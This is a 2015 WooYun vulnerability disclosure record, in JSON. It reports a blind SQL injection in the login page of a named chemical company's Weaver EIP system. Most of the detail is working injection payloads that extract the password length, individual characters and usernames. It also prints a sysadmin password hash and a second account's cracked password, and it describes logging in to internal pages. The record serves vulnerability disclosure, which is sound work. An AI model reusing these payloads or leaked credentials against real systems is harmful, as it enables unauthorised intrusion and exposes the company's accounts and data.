{"id": 70670, "wybug_id": "wooyun-2015-0134901", "wybug_title": "华润化工控股有限公司某分站存在SQL 注入漏洞，泄漏大量信息", "wybug_corp": "华润化工控股有限公司", "wybug_author": "浮萍", "wybug_date": "2015-08-18 12:45", "wybug_open_date": "2015-10-02 13:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-02：\t细节向公众公开  简要描述： SQL注入 详细说明：  采用的泛微系统http://eip.crcchem.com:89/login.do存在sql注入当输入任意用户名密码时会提示用户未找到\n\n当输入存在的用户名时会提示登录密码不正确\n\n用户名输入sysadmin'and'1'='1时 返回密码不正确\n\n\nloginid=sysadmin' and length(password)=32 and'1'='1&password=z&authcode=&dynapass=&tokenpass=&clienttype=Webclient&clientver=4.5&language=&country=&verify=&needdyna=\n密码加密后的长度为32位猜解密码\n\n\n\n\n\n\nloginid=sysadmin' and ascii(substr(password,1,1))=56 and'1'='1&password=z&authcode=&dynapass=&tokenpass=&clienttype=Webclient&clientver=4.5&language=&country=&verify=&needdyna=\n可猜解出来第一位对应的ascii为56  即为8\n\n可猜解出sysadmin对应的密码\n\nsysadmin密码为\n8D5E057546204DEC90D32839683E1DB3\n未解密成功   漏洞证明：  再获取一个用户\nloginid=a' or  length(loginid) =2 and'1'='1&password=z&authcode=&dynapass=&tokenpass=&clienttype=Webclient&clientver=4.5&language=&country=&verify=&needdyna=\n\n\n说明存在长度为2的用户\nloginid=a'or length(loginid)=2 and ascii(substr(loginid,1,1)) =102 and '1'='1&password=z&authcode=&dynapass=&tokenpass=&clienttype=Webclient&clientver=4.5&language=&country=&verify=&needdyna=loginid=a'or length(loginid)=2 and ascii(substr(loginid,1,1)) =102  and ascii(substr(loginid,2,1)) =119 and  '1'='1&password=z&authcode=&dynapass=&tokenpass=&clienttype=Webclient&clientver=4.5&language=&country=&verify=&needdyna=\n该对应的用户为fw然后使用脚本跑出密码\n\nfw对应密码为96E79218965EB72C92A549DD5A330112解密后为111111登录\n\n\n\n\n\n登录后应该也存在sql注入这里不测试了然后也可以登录http://eip.crcchem.com/login/Login.jsp?logintype=1\n\n通讯录\n\n其他信息就不查看了   修复方案：     版权声明：转载请注明来源 浮萍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-08-18 12:59 厂商回复： 很细心，满分，换我很可能忽略过去了，不过审代码应该会再审出来，已通知化工 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}